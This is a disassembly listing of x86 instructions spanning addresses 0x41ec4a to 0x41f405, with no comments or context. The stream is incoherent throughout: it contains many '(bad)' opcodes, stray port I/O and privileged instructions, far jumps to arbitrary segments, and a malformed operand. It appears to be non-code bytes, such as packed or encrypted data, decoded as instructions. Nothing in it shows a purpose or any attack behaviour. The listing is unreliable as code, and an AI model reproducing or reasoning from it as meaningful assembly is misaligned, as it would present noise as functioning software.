  41ec4a:	das    
  41ec4b:	mov    ecx,0x61bf8633
  41ec50:	inc    esp
  41ec51:	rcl    DWORD PTR [ecx+0x2b],1
  41ec54:	repnz add al,0xfd
  41ec57:	xchg   ebp,eax
  41ec58:	sbb    dh,BYTE PTR [esi-0x1c]
  41ec5b:	cmp    eax,0x47cac7b0
  41ec60:	cdq    
  41ec61:	mov    eax,0xcf59faed
  41ec66:	outs   dx,DWORD PTR ds:[esi]
  41ec67:	xor    al,0xa9
  41ec69:	xor    edx,DWORD PTR [ebx-0x16]
  41ec6c:	(bad)  
  41ec6d:	fild   WORD PTR ds:0x63714699
  41ec73:	push   0x4e9ba919
  41ec78:	mov    dh,0x3e
  41ec7a:	mov    ds:0x7f6462f9,eax
  41ec7f:	ins    BYTE PTR es:[edi],dx
  41ec80:	in     eax,dx
  41ec81:	int3   
  41ec82:	cdq    
  41ec83:	adc    cl,BYTE PTR [edi-0x6c]
  41ec86:	pusha  
  41ec87:	sbb    al,0x9b
  41ec89:	ins    DWORD PTR es:[edi],dx
  41ec8a:	dec    edx
  41ec8b:	push   esp
  41ec8c:	outs   dx,DWORD PTR ds:[esi]
  41ec8d:	outs   dx,BYTE PTR ds:[esi]
  41ec8e:	icebp  
  41ec8f:	inc    ebx
  41ec90:	(bad)  
  41ec91:	jp     0x41ecc1
  41ec93:	jl     0x41ed03
  41ec95:	addr16 mov al,0xa1
  41ec98:	dec    esi
  41ec99:	jnp    0x41ec8d
  41ec9b:	cmp    bh,BYTE PTR [ecx+0x4f]
  41ec9e:	inc    ebp
  41ec9f:	ins    DWORD PTR es:[edi],dx
  41eca0:	setg   al
  41eca3:	and    eax,ecx
  41eca5:	es jbe 0x41ec29
  41eca8:	shr    DWORD PTR [edi],cl
  41ecaa:	mov    ch,0x9b
  41ecac:	mov    al,ds:0xd713dc1c
  41ecb1:	mov    bh,0x8c
  41ecb3:	or     eax,0xd3cb9583
  41ecb8:	das    
  41ecb9:	sbb    al,0x3c
  41ecbb:	add    ebp,esp
  41ecbd:	or     DWORD PTR [esi+0x2b],ebp
  41ecc0:	retf   
  41ecc1:	dec    esi
  41ecc2:	adc    ebx,DWORD PTR [eax+ebp*2]
  41ecc5:	jg     0xdf833a47
  41eccb:	jmp    0x814e:0x20c17013
  41ecd2:	mov    ecx,0x10f83cc6
  41ecd7:	xor    al,0x98
  41ecd9:	pop    ds
  41ecda:	xor    edi,ecx
  41ecdc:	loop   0x41ec7a
  41ecde:	push   ds
  41ecdf:	jb     0x41ed1c
  41ece1:	clc    
  41ece2:	dec    eax
  41ece3:	mov    ebp,0x9724ce74
  41ece8:	jge    0x41ece5
  41ecea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eceb:	mov    ds:0x681aaf45,eax
  41ecf0:	mov    ah,0x9b
  41ecf2:	into   
  41ecf3:	fidiv  WORD PTR [ebx-0x691a11f1]
  41ecf9:	(bad)  
  41ecfa:	sub    edi,edx
  41ecfc:	dec    ebx
  41ecfd:	adc    esp,DWORD PTR [esi+ecx*8-0x256824bc]
  41ed04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed05:	(bad)  
  41ed06:	dec    ebx
  41ed07:	loope  0x41ed35
  41ed09:	imul   edx,DWORD PTR [ebx+0x389586b8],0xea95e9cc
  41ed13:	xor    DWORD PTR [edi-0x45d421c4],0xc9e8f5c9
  41ed1d:	arpl   WORD PTR [ebx+0x44],ax
  41ed20:	pop    edi
  41ed21:	xor    DWORD PTR [esi],edi
  41ed23:	pop    ebp
  41ed24:	mov    eax,0x13f0848c
  41ed29:	push   eax
  41ed2a:	mov    ebp,0x8489b447
  41ed2f:	push   cs
  41ed30:	xchg   ecx,eax
  41ed31:	gs pop eax
  41ed33:	clc    
  41ed34:	rcr    BYTE PTR [edx-0x34],1
  41ed37:	adc    BYTE PTR [eax],bl
  41ed39:	inc    ecx
  41ed3a:	xor    al,0x4f
  41ed3c:	push   edx
  41ed3d:	pop    esi
  41ed3e:	sbb    DWORD PTR [edi-0x18],esp
  41ed41:	or     eax,0xc0c434c5
  41ed46:	inc    edi
  41ed47:	adc    DWORD PTR [esi],esp
  41ed49:	cmp    edi,DWORD PTR ds:0x42ec5dad
  41ed4f:	inc    ecx
  41ed50:	mov    edx,cs
  41ed52:	adc    edi,edi
  41ed54:	mov    edi,0xf35842fa
  41ed59:	lds    ebp,FWORD PTR [ebx-0x949faf6]
  41ed5f:	pop    es
  41ed60:	push   0x35
  41ed62:	and    DWORD PTR [ecx+0x3bee33db],0x99a1019d
  41ed6c:	arpl   cx,si
  41ed6e:	jmp    0x41ed8a
  41ed70:	xor    BYTE PTR [edx-0x6391a7fd],ah
  41ed76:	jg     0x41ed6e
  41ed78:	jge    0x41edb8
  41ed7a:	adc    al,dl
  41ed7c:	bound  ebx,QWORD PTR [ebx+edi*4-0x10]
  41ed80:	xchg   DWORD PTR [edx+0x4f],ebp
  41ed83:	pop    ss
  41ed84:	test   BYTE PTR [edx+0x129ac37e],bh
  41ed8a:	jnp    0x41ee01
  41ed8c:	cmp    al,0x37
  41ed8e:	push   edx
  41ed8f:	pop    ds
  41ed90:	dec    esi
  41ed91:	push   esi
  41ed92:	inc    esp
  41ed93:	push   cs
  41ed94:	xor    ebp,DWORD PTR [ecx]
  41ed96:	push   eax
  41ed97:	data16 in al,0xa1
  41ed9a:	xchg   ecx,eax
  41ed9b:	addr16 cmp bl,al
  41ed9e:	mov    bl,0x9a
  41eda0:	sub    eax,0x5d14e342
  41eda5:	std    
  41eda6:	cli    
  41eda7:	xchg   ebp,eax
  41eda8:	xor    BYTE PTR [eax-0x9],dh
  41edab:	ret    
  41edac:	shl    BYTE PTR [ebp+0xd],1
  41edaf:	xchg   edi,eax
  41edb0:	or     DWORD PTR [ecx+0x7cccdd9c],esi
  41edb6:	shl    DWORD PTR [edi],0xc4
  41edb9:	outs   dx,DWORD PTR ds:[esi]
  41edba:	js     0x41eda3
  41edbc:	or     eax,0xce202e84
  41edc1:	add    DWORD PTR [eax-0x3781bc0f],edi
  41edc7:	scas   al,BYTE PTR es:[edi]
  41edc8:	push   ss
  41edc9:	xchg   edi,eax
  41edca:	add    DWORD PTR [edi+0x40fa8826],ecx
  41edd0:	dec    esi
  41edd1:	cmp    al,BYTE PTR [edi-0x69]
  41edd4:	mov    esi,0xa27d3a8b
  41edd9:	and    al,0xf4
  41eddb:	dec    ebx
  41eddc:	adc    ebx,ebx
  41edde:	shr    BYTE PTR [edi+0x51],1
  41ede1:	mov    cl,0x5c
  41ede3:	cmp    al,0x60
  41ede5:	xchg   edx,eax
  41ede6:	sbb    eax,0x2fa28a87
  41edeb:	out    dx,al
  41edec:	dec    eax
  41eded:	jmp    0x553fc1a2
  41edf2:	fcomp  DWORD PTR [edi+0x131c4785]
  41edf8:	mov    al,ds:0xf0e9b37c
  41edfd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41edfe:	ds sti 
  41ee00:	mov    bh,0x5
  41ee02:	mov    ds:0x3e260f45,al
  41ee07:	jl     0x41ee7e
  41ee09:	in     al,0x0
	...
  41ee17:	dec    edi
  41ee18:	mov    ecx,0x55fe40ac
  41ee1d:	out    dx,eax
  41ee1e:	mov    edi,0xc1f901e2
  41ee23:	pop    esp
  41ee24:	jne    0x41ee33
  41ee26:	int3   
  41ee27:	nop
  41ee28:	mov    edx,0x22b0001
  41ee2d:	add    BYTE PTR [eax],al
  41ee2f:	jnp    0x41ee04
  41ee31:	xlat   BYTE PTR ds:[ebx]
  41ee32:	mov    ebx,0x16c717
  41ee37:	mov    esi,0x56ac0ecb
  41ee3c:	mov    al,ds:0xbe5dc6cf
  41ee41:	add    al,0x3e
  41ee43:	in     eax,dx
  41ee44:	jnp    0x41ee67
  41ee46:	sub    BYTE PTR [edi],bl
  41ee48:	rep ins DWORD PTR es:[edi],dx
  41ee4a:	and    bh,ah
  41ee4c:	fisub  DWORD PTR [ecx-0x4c]
  41ee4f:	ds jno 0x41ee91
  41ee52:	mov    ds:0x20ea920,eax
  41ee57:	dec    esp
  41ee58:	xor    dh,al
  41ee5a:	div    BYTE PTR [eax-0x76]
  41ee5d:	jecxz  0x41ede5
  41ee5f:	inc    ecx
  41ee60:	inc    ecx
  41ee61:	push   esi
  41ee62:	int    0xb
  41ee64:	iret   
  41ee65:	(bad)  
  41ee67:	and    edi,ebx
  41ee69:	mov    esi,DWORD PTR [ecx+0x458e6a63]
  41ee6f:	dec    ecx
  41ee70:	pop    edi
  41ee71:	ficom  WORD PTR [edi+0x7b]
  41ee74:	retf   0xbd13
  41ee77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee78:	push   esp
  41ee79:	loop   0x41ee49
  41ee7b:	inc    ebp
  41ee7c:	cmp    eax,0xa79233a0
  41ee81:	mov    ch,0xee
  41ee83:	icebp  
  41ee84:	test   eax,0xd4123cdf
  41ee89:	ds aas 
  41ee8b:	mov    al,ds:0xd849d59f
  41ee90:	mov    ecx,0x4095b350
  41ee95:	pop    es
  41ee96:	sbb    eax,0x6bbcad47
  41ee9b:	push   edi
  41ee9c:	push   ebx
  41ee9d:	ja     0x41eea0
  41ee9f:	sub    eax,0x5f3dd3b0
  41eea4:	jne    0x41ee44
  41eea6:	jle    0x41eed2
  41eea8:	jg     0x41ee5d
  41eeaa:	(bad)  [esi-0x62]
  41eead:	pop    ds
  41eeae:	sbb    eax,0x53904f32
  41eeb3:	adc    DWORD PTR [edx],ebp
  41eeb5:	addr16 js 0x41ef1d
  41eeb8:	sub    eax,0x6602f383
  41eebd:	int3   
  41eebe:	cmp    al,0x91
  41eec0:	dec    BYTE PTR [edi]
  41eec2:	fisttp WORD PTR [ebx+0x7d]
  41eec5:	jns    0x41eeff
  41eec7:	mov    bh,0x9a
  41eec9:	mov    esp,0x363f9bad
  41eece:	jp     0x41ef15
  41eed0:	shl    DWORD PTR [ebp-0x70],1
  41eed3:	test   bh,bh
  41eed5:	out    dx,eax
  41eed6:	in     eax,0x7e
  41eed8:	mov    esp,DWORD PTR [esi]
  41eeda:	inc    esi
  41eedb:	lahf   
  41eedc:	dec    eax
  41eedd:	pop    ebp
  41eede:	or     DWORD PTR [edi*8-0x7d808f26],ebx
  41eee5:	or     BYTE PTR [ebx-0x3],cl
  41eee8:	jg     0x41ee94
  41eeea:	cmc    
  41eeeb:	dec    ebp
  41eeec:	div    DWORD PTR [ebx-0x4b6dbea1]
  41eef2:	and    al,0x42
  41eef4:	inc    esp
  41eef5:	(bad)  
  41eef6:	sbb    ebp,esi
  41eef8:	push   ecx
  41eef9:	lds    esi,FWORD PTR [esi+0x35]
  41eefc:	mov    esi,0xdee4f884
  41ef01:	in     eax,0x2e
  41ef03:	lds    eax,FWORD PTR [esi-0x1bde4a71]
  41ef09:	jmp    0x1c02:0x3e280183
  41ef10:	(bad)  
  41ef11:	inc    edx
  41ef12:	inc    ebx
  41ef13:	sub    al,0x1
  41ef15:	mov    ch,0x96
  41ef17:	std    
  41ef18:	or     al,0x56
  41ef1a:	ror    BYTE PTR [edx-0x5122a2f3],1
  41ef20:	add    BYTE PTR [ebx],ch
  41ef22:	ins    BYTE PTR es:[edi],dx
  41ef23:	and    BYTE PTR [ebx-0x58],0x3c
  41ef27:	push   0x19
  41ef29:	mov    ecx,0x32e05bc2
  41ef2e:	mov    dl,cl
  41ef30:	jmp    0xe0906348
  41ef35:	int    0xc5
  41ef37:	inc    ebx
  41ef38:	loope  0x41ef8a
  41ef3a:	add    al,0x71
  41ef3c:	retf   0x9b87
  41ef3f:	mov    ecx,0x302d98b0
  41ef44:	inc    DWORD PTR [edi-0x75]
  41ef47:	(bad)  
  41ef48:	je     0x41ef92
  41ef4a:	cmp    ch,bh
  41ef4c:	mov    edi,DWORD PTR [edx]
  41ef4e:	xchg   edi,eax
  41ef4f:	es push eax
  41ef51:	enter  0xde87,0xe7
  41ef55:	or     edi,DWORD PTR [esi+eax*8+0x1c]
  41ef59:	pushf  
  41ef5a:	or     ah,BYTE PTR [eax-0x4eb927cc]
  41ef60:	(bad)  
  41ef61:	out    dx,al
  41ef62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef63:	inc    edx
  41ef64:	shl    al,cl
  41ef66:	sub    esi,DWORD PTR [ebp+0xbb4609a]
  41ef6c:	icebp  
  41ef6d:	and    esi,edi
  41ef6f:	adc    esp,DWORD PTR [edx]
  41ef71:	pop    ecx
  41ef72:	gs (bad) 
  41ef74:	int3   
  41ef75:	test   dl,0x36
  41ef78:	cwde   
  41ef79:	mov    esp,0x1a656b37
  41ef7e:	xchg   ebx,eax
  41ef7f:	lods   eax,DWORD PTR ds:[esi]
  41ef80:	jecxz  0x41ef09
  41ef82:	mov    ecx,0x72cb8b6c
  41ef87:	ins    BYTE PTR es:[edi],dx
  41ef88:	repz or BYTE PTR [eax],bl
  41ef8b:	xor    BYTE PTR [ebx-0x1],dh
  41ef8e:	dec    edx
  41ef8f:	push   cs
  41ef90:	sbb    ebx,ebp
  41ef92:	shr    BYTE PTR [ebx],cl
  41ef94:	fist   DWORD PTR [ebx-0x2b]
  41ef97:	outs   dx,BYTE PTR ds:[esi]
  41ef98:	sub    DWORD PTR [edx-0x4ca2f911],edx
  41ef9e:	cmp    al,0xff
  41efa0:	adc    ebp,DWORD PTR [ecx]
  41efa2:	inc    ebp
  41efa3:	sar    DWORD PTR ds:0x1370d55,0xa1
  41efaa:	lahf   
  41efab:	js     0x41efc8
  41efad:	xchg   edi,eax
  41efae:	pop    eax
  41efaf:	mov    bl,0x97
  41efb1:	pop    es
  41efb2:	add    DWORD PTR [ebx+ebx*2],esp
  41efb5:	pusha  
  41efb6:	inc    esi
  41efb7:	pusha  
  41efb8:	(bad)  
  41efb9:	or     al,0xc5
  41efbb:	popf   
  41efbc:	ss xchg ebp,eax
  41efbe:	imul   esi,DWORD PTR [ebp+0x14],0x3e5fd784
  41efc5:	xchg   esp,eax
  41efc6:	out    0xd7,eax
  41efc8:	out    0x1e,eax
  41efca:	inc    esi
  41efcb:	loop   0x41efed
  41efcd:	dec    esp
  41efce:	cmp    esp,DWORD PTR [edi]
  41efd0:	ret    0x3e47
  41efd3:	(bad)  
  41efd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41efd5:	pop    eax
  41efd6:	les    ebx,FWORD PTR [eax]
  41efd8:	psubd  mm7,QWORD PTR [edx-0x41]
  41efdc:	sub    al,bl
  41efde:	test   eax,0x729d29b9
  41efe3:	fmul   QWORD PTR [bx+0x56ee]
  41efe8:	mov    esi,0x36766db7
  41efed:	push   ebp
  41efee:	shl    DWORD PTR [ecx+0x7d],1
  41eff1:	xchg   edi,eax
  41eff2:	push   esp
  41eff3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eff4:	mov    ebp,0x140d4b4a
  41eff9:	lock sub eax,0xd286f591
  41efff:	mov    cl,0xa5
  41f001:	dec    eax
  41f002:	popa   
  41f003:	dec    esp
  41f004:	test   al,0xd0
  41f006:	aas    
  41f007:	push   ebp
  41f008:	push   ss
  41f009:	cmc    
  41f00a:	lock fimul DWORD PTR [ebp+0x23]
  41f00e:	daa    
  41f00f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f010:	sub    al,0x76
  41f012:	dec    ebx
  41f013:	add    ch,bh
  41f015:	mov    eax,fs
  41f017:	pushf  
  41f018:	sbb    al,0xbc
  41f01a:	xchg   esi,eax
  41f01b:	jl     0x41f033
  41f01d:	fmul   QWORD PTR [ecx-0x79]
  41f020:	sub    eax,DWORD PTR [edi+ecx*8]
  41f023:	lea    edx,[edx]
  41f025:	xor    al,0xa0
  41f027:	loopne 0x41f05e
  41f029:	fist   WORD PTR [esi]
  41f02b:	sar    BYTE PTR [edx-0x15225995],0x1c
  41f032:	addr16 repnz hlt 
  41f035:	fst    QWORD PTR [edi]
  41f037:	jo     0x41efd6
  41f039:	cmp    bh,BYTE PTR [ebx+0x5a52a423]
  41f03f:	push   0x1a
  41f041:	jp     0x41f027
  41f043:	jo     0x41f049
  41f045:	test   al,0x5e
  41f047:	sub    bl,BYTE PTR [edi]
  41f049:	sbb    BYTE PTR [ebx+0x81e198d],dl
  41f04f:	gs jne 0x41f0c8
  41f052:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f053:	jb     0x41f072
  41f055:	mov    ?,WORD PTR [esi+0x2a]
  41f058:	and    eax,0xaa
	...
  41f065:	add    BYTE PTR [eax],al
  41f067:	imul   ebp,DWORD PTR [edx],0xffffffe1
  41f06a:	push   ecx
  41f06b:	loope  0x41f048
  41f06d:	sti    
  41f06e:	cmp    bl,BYTE PTR [ecx-0x78]
  41f071:	add    DWORD PTR [edx],0xffffff9a
  41f074:	jg     0x41f056
  41f076:	jb     0x41f033
  41f078:	mov    esp,0x22b0001
  41f07d:	add    BYTE PTR [eax],al
  41f07f:	leave  
  41f080:	add    DWORD PTR [edx],ecx
  41f082:	sbb    eax,0xb7d80380
  41f087:	jmp    0xea3f2d66
  41f08c:	mov    dh,0x7
  41f08e:	sub    DWORD PTR [ecx+0x27e14717],ebp
  41f094:	mov    al,ch
  41f096:	mov    DWORD PTR [ecx-0x4e],edi
  41f099:	add    esp,esi
  41f09b:	shr    BYTE PTR [esp+eax*2+0x31eaed11],0xe7
  41f0a3:	cli    
  41f0a4:	pusha  
  41f0a5:	fscale 
  41f0a7:	mov    al,ah
  41f0a9:	jp     0x41f0c6
  41f0ab:	cmp    bl,bh
  41f0ad:	jns    0x41f09c
  41f0af:	inc    esi
  41f0b0:	fiadd  DWORD PTR [edx-0x5371ce27]
  41f0b6:	jp     0x41f04f
  41f0b8:	push   cs
  41f0b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f0ba:	int    0xfa
  41f0bc:	cld    
  41f0bd:	mov    ch,0x5d
  41f0bf:	cmp    dl,BYTE PTR [esi+0x52]
  41f0c2:	mov    ebp,0x8414b47b
  41f0c7:	jg     0x41f0c6
  41f0c9:	popa   
  41f0ca:	ret    
  41f0cb:	clc    
  41f0cc:	xchg   edi,eax
  41f0cd:	dec    ecx
  41f0ce:	inc    ebx
  41f0cf:	imul   ebp,DWORD PTR [esi+0x26],0xe8e4e7a9
  41f0d6:	sbb    BYTE PTR es:[edx+ebp*1],0x3a
  41f0db:	jmp    0xa06e2476
  41f0e0:	cli    
  41f0e1:	jmp    0x415c:0x5cf56e3d
  41f0e8:	xor    eax,0xc43fe13
  41f0ed:	xor    al,0xe0
  41f0ef:	dec    esp
  41f0f0:	js     0x41f0f0
  41f0f2:	(bad)  
  41f0f3:	lods   al,BYTE PTR ds:[esi]
  41f0f4:	push   ebp
  41f0f5:	dec    edx
  41f0f6:	add    al,0xcf
  41f0f8:	sbb    dh,ch
  41f0fa:	xchg   edi,eax
  41f0fb:	jg     0x41f09d
  41f0fd:	push   edi
  41f0ff:	mov    edi,0x608947bc
  41f104:	dec    edx
  41f105:	sub    ah,BYTE PTR [eax-0x7d1d5b64]
  41f10b:	in     eax,0xbe
  41f10d:	or     al,0x55
  41f10f:	jae    0x41f101
  41f111:	aad    0x8e
  41f113:	call   0xb2318013
  41f118:	adc    eax,0x8ffe45f1
  41f11d:	mov    bh,0x64
  41f11f:	popf   
  41f120:	fiadd  WORD PTR [esp+eax*4]
  41f123:	adc    BYTE PTR [edx+0x7e8fa534],dh
  41f129:	adc    al,0xba
  41f12b:	dec    esp
  41f12c:	mov    ecx,0xcf90a1a1
  41f131:	pusha  
  41f132:	fldenv ds:0xb4e0553
  41f138:	xchg   BYTE PTR [esi],dl
  41f13a:	sahf   
  41f13b:	pshufw mm3,mm3,0xc7
  41f13f:	pop    esi
  41f140:	jo     0x41f1bc
  41f142:	pop    edi
  41f143:	cmp    esi,DWORD PTR [eax+eiz*4]
  41f146:	nop
  41f147:	mov    BYTE PTR [esi+ebx*8+0x513935a9],ah
  41f14e:	cwde   
  41f14f:	les    ebp,FWORD PTR [edx-0x70]
  41f152:	dec    esp
  41f153:	imul   ebx,DWORD PTR [edx+0x7ff1607e],0xb5c36b26
  41f15d:	cmp    eax,0x3a27d1a0
  41f162:	imul   esi,DWORD PTR [edi-0x39],0xffffffd8
  41f166:	shl    DWORD PTR [eax-0x7e9e0b63],0x39
  41f16d:	sub    eax,0x66f1e0bf
  41f172:	push   0x58
  41f174:	shl    BYTE PTR [ebp+0x71bfbfc8],0x1a
  41f17b:	add    DWORD PTR ds:0x9267f724,eax
  41f181:	mov    dh,0x57
  41f183:	mov    dh,0xa0
  41f185:	adc    bl,BYTE PTR [edx+ebp*1]
  41f188:	sbb    DWORD PTR [edi+0x6ed944e9],edi
  41f18e:	mov    ebx,0x11ed6b9
  41f193:	cmp    al,0xf2
  41f195:	ds test al,0x5c
  41f198:	ret    0x7af4
  41f19b:	mov    eax,0x3da55e94
  41f1a0:	ds lock push esp
  41f1a3:	sbb    eax,0x8345cd68
  41f1a8:	mov    ecx,0x6d562b5b
  41f1ad:	aaa    
  41f1ae:	cmp    DWORD PTR [ecx],ebx
  41f1b0:	inc    edx
  41f1b1:	nop
  41f1b2:	pop    ecx
  41f1b3:	jg     0x41f22f
  41f1b5:	xor    DWORD PTR [edx+0x4b64d2bb],esi
  41f1bb:	pop    esi
  41f1bc:	popf   
  41f1bd:	rol    BYTE PTR [eax-0x28e40b13],cl
  41f1c3:	pop    ecx
  41f1c4:	cmp    ch,BYTE PTR [edx+0x627ceba7]
  41f1ca:	or     DWORD PTR [ecx-0x5c],edx
  41f1cd:	adc    eax,0x8cf410f7
  41f1d2:	retf   
  41f1d3:	aas    
  41f1d4:	mov    ebp,0x30f85f2d
  41f1d9:	mov    al,ds:0x9a074c25
  41f1de:	inc    esi
  41f1df:	cdq    
  41f1e0:	cli    
  41f1e1:	test   BYTE PTR [edx+0x6cd9cf53],dl
  41f1e7:	rcl    DWORD PTR [edx-0x2e1a08fa],1
  41f1ed:	daa    
  41f1ee:	sbb    eax,0xe28bb060
  41f1f3:	ror    cl,cl
  41f1f5:	cld    
  41f1f6:	pop    esi
  41f1f7:	mov    dh,0x67
  41f1f9:	adc    ch,dl
  41f1fb:	adc    eax,0x162a4a23
  41f200:	stos   DWORD PTR es:[edi],eax
  41f201:	xor    al,0x88
  41f203:	mov    eax,0x277c88b5
  41f208:	lahf   
  41f209:	push   0xcdc85ee6
  41f20e:	bnd ret 
  41f210:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f211:	out    dx,eax
  41f212:	shl    DWORD PTR [ebp-0x76dd1da0],0x4f
  41f219:	aad    0x55
  41f21b:	xchg   esp,ebp
  41f21d:	push   ebp
  41f21e:	mov    ebp,0x2dabc7dc
  41f223:	mov    ebp,0x433ea098
  41f228:	(bad)
  41f22d:	mov    bl,0xf3
  41f22f:	xor    BYTE PTR [ecx+0x1a5a55],0xd0
  41f236:	fsub   DWORD PTR [esi-0x70]
  41f239:	(bad)  
  41f23a:	ror    BYTE PTR [ebx+ebp*8-0x1f742538],0x93
  41f242:	jg     0x41f28f
  41f244:	outs   dx,BYTE PTR ds:[esi]
  41f245:	mov    dh,0x13
  41f247:	fs xchg esp,eax
  41f249:	pop    DWORD PTR [esi+0x6ebc2551]
  41f24f:	das    
  41f250:	(bad)
  41f253:	loope  0x41f1e5
  41f255:	cmp    al,0xcd
  41f257:	dec    edx
  41f258:	leave  
  41f259:	ins    DWORD PTR es:[edi],dx
  41f25a:	test   DWORD PTR [ebx+0x368e113f],edx
  41f260:	cmp    eax,0xdc21ae59
  41f265:	add    bl,BYTE PTR [esi-0x7a]
  41f268:	mov    al,ds:0xf3f1c789
  41f26d:	push   0x4ef10a20
  41f272:	arpl   sp,bp
  41f274:	aam    0x8a
  41f276:	push   edx
  41f277:	inc    esi
  41f278:	in     al,0xab
  41f27a:	sbb    BYTE PTR [esi+0x5b],ch
  41f27d:	je     0x41f29d
  41f27f:	jo     0x41f275
  41f281:	test   al,0xeb
  41f283:	push   esp
  41f284:	mov    dh,0x90
  41f286:	jae    0x41f26d
  41f288:	mov    ebx,0x88c0ddbf
  41f28d:	xor    eax,edi
  41f28f:	lahf   
  41f290:	call   0xed34ff5e
  41f295:	rol    ah,1
  41f297:	cld    
  41f298:	adc    BYTE PTR [edi-0x4a6b2b23],dl
  41f29e:	cmc    
  41f29f:	inc    ecx
  41f2a0:	out    0x76,eax
  41f2a2:	pop    eax
  41f2a3:	jl     0x41f2fe
  41f2a5:	or     eax,0x9a5f13e0
	...
  41f2b6:	add    BYTE PTR [edi],bh
  41f2b8:	test   al,0xc7
  41f2ba:	fcom   st(7)
  41f2bc:	(bad)  
  41f2bd:	aas    
  41f2be:	out    dx,eax
  41f2bf:	out    0x53,ax
  41f2c2:	jge    0x41f2b1
  41f2c4:	pop    esp
  41f2c5:	popf   
  41f2c6:	in     al,dx
  41f2c7:	fidiv  DWORD PTR [eax+0x1]
  41f2ca:	add    BYTE PTR [ebx],ch
  41f2cc:	add    al,BYTE PTR [eax]
  41f2ce:	add    BYTE PTR [edi+0x39],ch
  41f2d1:	add    eax,DWORD PTR [esi]
  41f2d3:	in     al,dx
  41f2d4:	pop    esi
  41f2d5:	mov    cl,0x14
  41f2d7:	xchg   ebx,eax
  41f2d8:	pop    ecx
  41f2d9:	pop    ecx
  41f2da:	jo     0x41f316
  41f2dc:	arpl   WORD PTR [edi+0x48],di
  41f2df:	lock outs dx,BYTE PTR ds:[esi]
  41f2e1:	cmp    DWORD PTR [ecx+0x25],edx
  41f2e4:	scas   al,BYTE PTR es:[edi]
  41f2e5:	pop    ebp
  41f2e6:	pop    es
  41f2e7:	push   esp
  41f2e8:	fwait
  41f2e9:	or     al,0x76
  41f2eb:	mov    bl,0xf
  41f2ed:	imul   esi,DWORD PTR [ebx],0xffffffd0
  41f2f0:	or     DWORD PTR [edi+ebx*2],edi
  41f2f3:	add    eax,0xa988aadd
  41f2f8:	inc    edi
  41f2f9:	sar    dl,0xa8
  41f2fc:	mov    dh,ah
  41f2fe:	adc    ah,bl
  41f300:	imul   ebx,DWORD PTR [ebx-0x1e297630],0xd27b0a06
  41f30a:	popa   
  41f30b:	cwde   
  41f30c:	mov    edi,0x2958b0f8
  41f311:	cmp    BYTE PTR [ecx-0x40],ch
  41f314:	inc    edi
  41f315:	mov    fs,WORD PTR ds:0x7582a9a1
  41f31b:	xchg   esp,eax
  41f31c:	aam    0xc4
  41f31e:	sub    ah,0x10
  41f321:	mov    bl,0x3e
  41f323:	test   eax,0x54c65cf2
  41f328:	sub    DWORD PTR [esi-0x53ebbb55],ebp
  41f32e:	arpl   di,cx
  41f330:	out    dx,al
  41f331:	mov    bh,0x35
  41f333:	pop    es
  41f334:	retf   0xaefb
  41f337:	push   ds
  41f338:	cs das 
  41f33a:	adc    DWORD PTR [ecx],esp
  41f33c:	pusha  
  41f33d:	sahf   
  41f33e:	sbb    BYTE PTR [esi],dh
  41f340:	ja     0x41f381
  41f342:	(bad)  
  41f343:	cli    
  41f344:	mov    cl,0xba
  41f346:	push   0x7e549f99
  41f34b:	adc    al,0xc9
  41f34d:	ret    
  41f34e:	cdq    
  41f34f:	cmc    
  41f350:	jae    0x41f3a8
  41f352:	in     al,dx
  41f353:	inc    ebp
  41f354:	cmc    
  41f355:	arpl   WORD PTR [eax],bx
  41f357:	imul   esi,DWORD PTR [ebx+0x7],0xffffffc1
  41f35b:	es out 0xa0,al
  41f35e:	js     0x41f3a0
  41f360:	sub    al,0x92
  41f362:	push   ds
  41f363:	dec    ecx
  41f364:	mov    ebx,0x512f63d6
  41f369:	aas    
  41f36a:	xchg   ecx,eax
  41f36b:	cmp    bl,BYTE PTR [ecx]
  41f36d:	mov    ecx,0x17ccdc0a
  41f372:	fiadd  DWORD PTR [esi+ecx*2]
  41f375:	push   0x1eb918ea
  41f37a:	bound  edx,QWORD PTR [edx-0x387d9ce1]
  41f380:	addr16 xor edi,esi
  41f383:	rcl    BYTE PTR ds:0x2af59599,cl
  41f389:	test   BYTE PTR [ebp+0x38da4ca3],cl
  41f38f:	or     BYTE PTR [ecx-0x44],al
  41f392:	clc    
  41f393:	and    al,0x76
  41f395:	jmp    0xba8b:0x4e1ca070
  41f39c:	mov    ah,0xef
  41f39e:	mov    bl,0x9f
  41f3a0:	hlt    
  41f3a1:	sti    
  41f3a2:	not    DWORD PTR [ebx]
  41f3a4:	and    BYTE PTR [ecx],ch
  41f3a6:	mov    ds:0xb03e995d,al
  41f3ab:	and    DWORD PTR [ebp-0x4a],eax
  41f3ae:	scas   al,BYTE PTR es:[edi]
  41f3af:	mov    ch,0x4c
  41f3b1:	lea    ecx,[ebx+0x62]
  41f3b4:	jp     0x41f385
  41f3b6:	push   esi
  41f3b7:	xor    eax,0x8b5546cc
  41f3bc:	push   0x8557f45b
  41f3c1:	jnp    0x41f353
  41f3c3:	sti    
  41f3c4:	call   0x32d2ea2f
  41f3c9:	fild   DWORD PTR [edi-0x80]
  41f3cc:	mov    WORD PTR [edi+ebx*8+0x17],es
  41f3d0:	lahf   
  41f3d1:	xor    eax,0x351c34f9
  41f3d6:	push   0x872d3266
  41f3db:	mov    ch,0x5b
  41f3dd:	adc    BYTE PTR [ebx-0x854abdc],ch
  41f3e3:	je     0x41f3e2
  41f3e5:	in     al,dx
  41f3e6:	inc    ecx
  41f3e7:	push   esp
  41f3e8:	jae    0x41f3ad
  41f3ea:	push   0x36
  41f3ec:	daa    
  41f3ed:	cs xchg esi,eax
  41f3ef:	(bad)  
  41f3f0:	jmp    0x67d7f0a
  41f3f5:	mov    ds:0x2eb8ac66,al
  41f3fa:	push   esp
  41f3fb:	mov    eax,ds:0x8ac8869a
  41f400:	push   0xe08d2ca7
  41f405:	cmp    BYTE PTR [esi+0x3a],al
